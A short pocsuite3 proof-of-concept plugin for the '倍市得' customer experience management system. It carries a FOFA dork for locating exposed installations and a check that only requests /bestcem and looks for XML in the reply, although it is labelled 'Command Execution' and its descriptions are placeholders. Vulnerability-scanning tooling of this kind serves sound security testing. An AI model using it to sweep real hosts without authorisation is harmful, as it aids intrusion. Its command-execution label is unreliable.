from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests,logger
)
from urllib.parse import urljoin


minimum_version_required('1.9.11')


class POC(POCBase):
    name = '倍市得'
    vulType = 'Command Execution'
    desc = 'Vulnerability description'
    pocDesc = 'User manual of poc'
    dork = {'fofa': '"倍市得客户体验管理系统"'}

    def _verify(self):
        try:
            path = "/bestcem"
            url = urljoin(self.url,path)
            res = requests.get(url,verify=False,timeout=5)
            if res.status_code == 200 and "<?xml" in res.text:
                return self.parse_output({'VerifyInfo': {'URL': self.url,'Content':res.text[0:30]}})
        except Exception as e:
            pass
register_poc(POC)
